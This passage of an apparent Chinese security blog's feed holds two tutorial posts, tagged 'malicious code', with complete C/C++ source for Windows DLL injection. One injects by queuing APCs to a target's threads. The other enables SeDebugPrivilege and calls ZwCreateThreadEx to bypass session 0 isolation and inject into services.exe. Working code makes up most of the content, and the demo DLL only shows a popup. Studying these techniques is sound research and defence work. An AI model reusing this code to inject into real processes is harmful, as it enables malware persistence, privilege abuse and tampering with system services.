class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">RtlZeroMemory</span>(pThreadId, (dwBufferLength * <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD)));</span><br><span class="line">        <span class="comment">// 获取线程快照</span></span><br><span class="line">        <span class="built_in">RtlZeroMemory</span>(&amp;te32, <span class="built_in"><span class="keyword">sizeof</span></span>(te32));</span><br><span class="line">        te32.dwSize = <span class="built_in"><span class="keyword">sizeof</span></span>(te32);</span><br><span class="line">        hSnapshot = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPTHREAD, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">NULL</span> == hSnapshot)</span><br><span class="line">        &#123;</span><br><span class="line">            bRet = FALSE;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 获取第一条线程快照信息</span></span><br><span class="line">        bRet = <span class="built_in">Thread32First</span>(hSnapshot, &amp;te32);</span><br><span class="line">        <span class="keyword">while</span> (bRet)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 获取进程对应的线程ID</span></span><br><span class="line">            <span class="keyword">if</span> (te32.th32OwnerProcessID == dwProcessId)</span><br><span class="line">            &#123;</span><br><span class="line">                pThreadId[dwThreadIdLength] = te32.th32ThreadID;</span><br><span class="line">                dwThreadIdLength++;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 遍历下一个线程快照信息</span></span><br><span class="line">            bRet = <span class="built_in">Thread32Next</span>(hSnapshot, &amp;te32);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 返回</span></span><br><span class="line">        *ppThreadId = pThreadId;</span><br><span class="line">        *pdwThreadIdLength = dwThreadIdLength;</span><br><span class="line">        bRet = TRUE;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">while</span> (FALSE);</span><br><span class="line">    <span class="keyword">if</span> (FALSE == bRet)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pThreadId)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">delete</span>[]pThreadId;</span><br><span class="line">            pThreadId = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOL <span class="title">Inject</span><span class="params">(<span class="keyword">char</span>* pszProcessName, <span class="keyword">char</span>* pszDllname)</span> </span>&#123;</span><br><span class="line">    BOOL flag = FALSE;</span><br><span class="line">    DWORD dwPID = <span class="number">0</span>;</span><br><span class="line">    DWORD* pThreadId = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD dwThreadLength = <span class="number">0</span>;</span><br><span class="line">    HANDLE hProcess = <span class="literal">NULL</span>;</span><br><span class="line">    HANDLE hThread = <span class="literal">NULL</span>;</span><br><span class="line">    PVOID pBaseAddress = <span class="literal">NULL</span>;</span><br><span class="line">    PVOID pLoadLibraryFunc = <span class="literal">NULL</span>;</span><br><span class="line">    SIZE_T dwRet = <span class="number">0</span>, dwDllPathLen = <span class="built_in">strlen</span>(pszDllname) + <span class="number">1</span>;</span><br><span class="line">    DWORD i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="comment">//获取进程的PID</span></span><br><span class="line">        dwPID = <span class="built_in">GetPidByName</span>(pszProcessName);</span><br><span class="line">        <span class="keyword">if</span> (dwPID == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;获取PID失败\n&quot;</span>);</span><br><span class="line">            flag = FALSE;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//获取所有线程ID</span></span><br><span class="line">        flag = <span class="built_in">GetAllThreadIdByProcessId</span>(dwPID, &amp;pThreadId, &amp;dwThreadLength);</span><br><span class="line">        <span class="keyword">if</span> (flag == FALSE) &#123;</span><br><span class="line">            flag = FALSE;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//打开进程</span></span><br><span class="line">        hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPID);</span><br><span class="line">        <span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;打开进程失败\n&quot;</span>);</span><br><span class="line">            flag = FALSE;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//申请内存空间</span></span><br><span class="line">        pBaseAddress = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, dwDllPathLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">        <span class="keyword">if</span> (pBaseAddress == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;申请空间失败\n&quot;</span>);</span><br><span class="line">            flag = FALSE;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//向申请的空间写入内存</span></span><br><span class="line">        <span class="built_in">WriteProcessMemory</span>(hProcess, pBaseAddress, pszDllname, dwDllPathLen, &amp;dwRet);</span><br><span class="line">        <span class="keyword">if</span> (dwRet != dwDllPathLen) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;写入内存失败\n&quot;</span>);</span><br><span class="line">            flag = FALSE;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        pLoadLibraryFunc = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (pLoadLibraryFunc == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;获取loadlibrary地址失败\n&quot;</span>);</span><br><span class="line">            flag = FALSE;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//向所有的线程插入APC函数</span></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; dwThreadLength; i++) &#123;</span><br><span class="line">            hThread = <span class="built_in">OpenThread</span>(THREAD_ALL_ACCESS, FALSE, pThreadId[i]);</span><br><span class="line">            <span class="keyword">if</span> (hThread) &#123;</span><br><span class="line">                <span class="built_in">QueueUserAPC</span>((PAPCFUNC)pLoadLibraryFunc, hThread, (ULONG_PTR)pBaseAddress);</span><br><span class="line">                <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">                hThread = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        flag = TRUE;</span><br><span class="line">    &#125; <span class="keyword">while</span> (FALSE);</span><br><span class="line">    <span class="keyword">if</span> (hProcess) &#123;</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">        hProcess = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (pThreadId) &#123;</span><br><span class="line">        <span class="keyword">delete</span>[]pThreadId;</span><br><span class="line">        pThreadId = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    BOOL flag=<span class="built_in">Inject</span>(<span class="string">&quot;TestApc.exe&quot;</span>, <span class="string">&quot;C:\\Users\\Tophanter\\Desktop\\RemoteTest.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (flag == TRUE) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;注入成功\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;失败\n&quot;</span>);</span><br><span class="line">    <span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="效果查看"><a href="#效果查看" class="headerlink" title="效果查看"></a>效果查看</h4><p>写一个MFC的小程序，点击确定按钮之后就会调用SleepEx函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CTestApcDlg::OnBnClickedOk</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line"><span class="built_in">SleepEx</span>(<span class="number">10000</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="comment">//CDialogEx::OnOK();</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/07/13/APC%E6%B3%A8%E5%85%A5/1.png"></p><p>然后打开我们的注入程序，看到提示已经注入成功。</p><p><img src="/2021/07/13/APC%E6%B3%A8%E5%85%A5/2.png"></p><p>点击确定按钮，就会弹出我们在DLL里写好的弹窗。</p><p><img src="/2021/07/13/APC%E6%B3%A8%E5%85%A5/3.png"></p><p>使用process explore工具查看可以看到我们的DLL已经注入到TestApc.exe中了。</p><p><img src="/2021/07/13/APC%E6%B3%A8%E5%85%A5/4.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;APC注入&quot;&gt;&lt;a href=&quot;#APC注入&quot; class=&quot;headerlink&quot; title=&quot;APC注入&quot;&gt;&lt;/a&gt;APC注入&lt;/h4&gt;&lt;p&gt;APC为异步过程调用，是指函数在特定线程中被异步执行。每一个线程都有自己的APC队列，使用QueueUserAPC函</summary>
      
    
    
    
    <category term="黑客编程" scheme="https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="恶意代码" scheme="https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    
    <category term="黑客编程" scheme="https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    <category term="注入" scheme="https://b1ack1e.github.io/tags/%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>突破session 0隔离的远线程注入</title>
    <link href="https://b1ack1e.github.io/2021/07/13/%E7%AA%81%E7%A0%B4SESSION%200%E9%9A%94%E7%A6%BB%E7%9A%84%E8%BF%9C%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/"/>
    <id>https://b1ack1e.github.io/2021/07/13/%E7%AA%81%E7%A0%B4SESSION%200%E9%9A%94%E7%A6%BB%E7%9A%84%E8%BF%9C%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/</id>
    <published>2021-07-13T02:02:17.000Z</published>
    <updated>2021-07-13T07:24:27.810Z</updated>
    
    <content type="html"><![CDATA[<h4 id="SESSION-0隔离"><a href="#SESSION-0隔离" class="headerlink" title="SESSION 0隔离"></a>SESSION 0隔离</h4><p>在早期操作系统中，所有的服务和应用程序都是运行在同一个session中，session 0。这些一起运行的服务与应用程序，由于服务是以最高权限进行运行的，所以造成一些安全风险，恶意代码可以利用这点来提升自己的权限。</p><p>在Visita中，服务在一个叫做session0的特殊session中承载。应用程序在其他session中，这样服务与应用程序就隔离开来。这样的话，恶意代码要向注入到关键的系统服务进程中，就会因为session 0的隔离而失败。</p><p>但是直接调用zwCreateThreadEx函数可以进行远线程注入，还可以突破隔离。</p><h4 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h4><p>实现突破SESSION 0隔离的注入技术是使用比CreateRemoteThread函数更为底层的ZwCreateThreadEx函数来创建的远线程的。因为此函数在ntdll.dll中没有声明，所以需要使用GetProcAddress从ntdll.dll中获取该函数的导出地址。</p><p>ZwCreateThreadEx函数比CreateRemoteThread函数更为底层，那么CreateRemoteThread函数最终还是通过调用ZwCreateThreadEx函数来实现远线程创建的。为什么使用CreateRemoteThread函数没有用。经过前人的跟踪与分析，发现调用ZwCreateThreadEx函数创建远线程的时候，第七个参数的值为1，这会导致创建的线程完成后一直挂起无法恢复运行，这就是为什么DLL注入失败的原因。要想成功的话，就要直接调用ZwCreateThreadEx函数，将第七个参数设置为0，这样线程创建完成之后就会恢复运行，成功注入。</p><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;processthreadsapi.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;atlconv.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;atlstr.h&gt;</span></span></span><br><span class="line"><span class="function">BOOL <span class="title">CreateRemoteThreadInject</span><span class="params">(DWORD dwProcessId, WCHAR* pszDllFileName)</span> </span>&#123;</span><br><span class="line"><span class="comment">//提升权限</span></span><br><span class="line">HANDLE hToken;</span><br><span class="line"><span class="keyword">if</span> (OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &amp;hToken) == <span class="literal">false</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;打开近访问令牌失败\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">LUID luid;</span><br><span class="line"><span class="keyword">if</span> (LookupPrivilegeValue(<span class="literal">NULL</span>, SE_DEBUG_NAME, &amp;luid) == <span class="literal">false</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;查看特权信息失败\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">TOKEN_PRIVILEGES tkp;</span><br><span class="line">tkp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">tkp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">tkp.Privileges[<span class="number">0</span>].Luid = luid;</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">false</span> == AdjustTokenPrivileges(hToken, FALSE, &amp;tkp, <span class="keyword">sizeof</span>(tkp), <span class="literal">NULL</span>, <span class="literal">NULL</span>)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;调节权限失败\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">HANDLE hProcess = <span class="literal">NULL</span>;</span><br><span class="line">DWORD dwSize = <span class="number">0</span>;</span><br><span class="line">LPVOID pDllAddr = <span class="literal">NULL</span>;</span><br><span class="line">FARPROC pFuncProcAddr = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">//获取注入进程句柄</span></span><br><span class="line">hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);</span><br><span class="line"><span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;打开进程失败\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">dwSize = lstrlen(pszDllFileName) + <span class="number">1</span>;</span><br><span class="line"><span class="comment">//printf(&quot;dwSize:%d\n&quot;, dwSize);</span></span><br><span class="line"><span class="comment">//申请内存</span></span><br><span class="line">pDllAddr = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, <span class="number">0x100</span>, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (pDllAddr == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;申请内存失败\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//向申请的内存写入数据</span></span><br><span class="line">BOOL WriteFlag = WriteProcessMemory(hProcess, pDllAddr, pszDllFileName, dwSize * <span class="number">2</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (WriteFlag == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;写入内存失败\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">HMODULE hNtdll = LoadLibrary(<span class="string">L&quot;ntdll.dll&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (hNtdll == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;获取NTDLL地址失败\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//获取loadlibrary</span></span><br><span class="line">pFuncProcAddr = GetProcAddress(GetModuleHandle(<span class="string">L&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (pFuncProcAddr == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;获取loadlibrary地址失败\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* typedef_ZwCreateThreadEx)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">PHANDLE ThreadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID ObjectAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">ULONG CreateThreadFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">SIZE_T ZeroBits,</span></span></span><br><span class="line"><span class="params"><span class="function">SIZE_T StackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">SIZE_T MaximumStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID pUnkown)</span></span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* typedef_ZwCreateThreadEx)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">PHANDLE ThreadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID ObjectAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">BOOL CreateSuspended,</span></span></span><br><span class="line"><span class="params"><span class="function">DWORD dwStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">DWORD dw1,</span></span></span><br><span class="line"><span class="params"><span class="function">DWORD dw2,</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID pUnkown)</span></span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">typedef_ZwCreateThreadEx ZwCreateThreadEx = (typedef_ZwCreateThreadEx)GetProcAddress(hNtdll, <span class="string">&quot;ZwCreateThreadEx&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (ZwCreateThreadEx == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;获取ZW地址失败\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">HANDLE hRemoteThread = <span class="literal">NULL</span>;</span><br><span class="line">ZwCreateThreadEx(&amp;hRemoteThread, PROCESS_ALL_ACCESS, <span class="literal">NULL</span>, hProcess, (LPTHREAD_START_ROUTINE)pFuncProcAddr, pDllAddr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hRemoteThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;创建失败\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">CloseHandle(hProcess);</span><br><span class="line">FreeLibrary(hNtdll);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">DWORD <span class="title">GetPID</span><span class="params">(<span class="keyword">char</span>* pszProcessName)</span> </span>&#123;</span><br><span class="line">HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">PROCESSENTRY32 pe = &#123; <span class="keyword">sizeof</span>(pe) &#125;;<span class="comment">//初始化</span></span><br><span class="line">USES_CONVERSION;</span><br><span class="line">CString ProcessName = A2T(pszProcessName);</span><br><span class="line">BOOL flag = Process32First(hSnap, &amp;pe);</span><br><span class="line"><span class="keyword">while</span> (flag) &#123;</span><br><span class="line"><span class="keyword">if</span> (lstrcmp(pe.szExeFile, ProcessName) == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> pe.th32ProcessID;</span><br><span class="line">&#125;</span><br><span class="line">flag = Process32Next(hSnap, &amp;pe);</span><br><span class="line">&#125;</span><br><span class="line">CloseHandle(hSnap);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;按下回车开始注入\n&quot;</span>);</span><br><span class="line">getchar();</span><br><span class="line">DWORD dwPID = GetPID(<span class="string">&quot;services.exe&quot;</span>);</span><br><span class="line"><span class="keyword">bool</span> flag = CreateRemoteThreadInject(dwPID, <span class="string">L&quot;C:\\Users\\b1ackie\\Desktop\\RemoteTest.dll&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (flag == FALSE) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;注入失败\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;注入成功\n&quot;</span>);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="效果查看"><a href="#效果查看" class="headerlink" title="效果查看"></a>效果查看</h4><p>尝试注入SESSION 0的service.exe，使用Process Explorer可以看到services.exe的相关信息</p><p><img src="/2021/07/13/%E7%AA%81%E7%A0%B4SESSION%200%E9%9A%94%E7%A6%BB%E7%9A%84%E8%BF%9C%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/2.png"></p><p>打开程序，按下回车开始注入，显示注入成功</p><p><img src="/2021/07/13/%E7%AA%81%E7%A0%B4SESSION%200%E9%9A%94%E7%A6%BB%E7%9A%84%E8%BF%9C%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/1.png"></p><p>使用Process Explorer查看services.exe的导入模块</p><p><img src="/2021/07/13/%E7%AA%81%E7%A0%B4SESSION%200%E9%9A%94%E7%A6%BB%E7%9A%84%E8%BF%9C%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/3.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;SESSION-0隔离&quot;&gt;&lt;a href=&quot;#SESSION-0隔离&quot; class=&quot;headerlink&quot; title=&quot;SESSION 0隔离&quot;&gt;&lt;/a&gt;SESSION 0隔离&lt;/h4&gt;&lt;p&gt;在早期操作系统中，所有的服务和应用程序都是运行在同一个session</summary>
      
    
    
    
    <category term="黑客编程" scheme="https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="恶意代码" scheme="https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    
    <category term="黑客编程" scheme="https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    <category term="注入" scheme="https://b1ack1e.github.io/tags/%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>远程线程注入</title>
    <link href="https://b1ack1e.github.io/2021/07/12/%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/"/>
    <id>https://b1ack1e.github.io/2021/07/12/%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/</id>
    <published>2021-07-12T03:56:15.000Z</published>
    <updated>2021-07-12T11:10:48.423Z</updated>
    
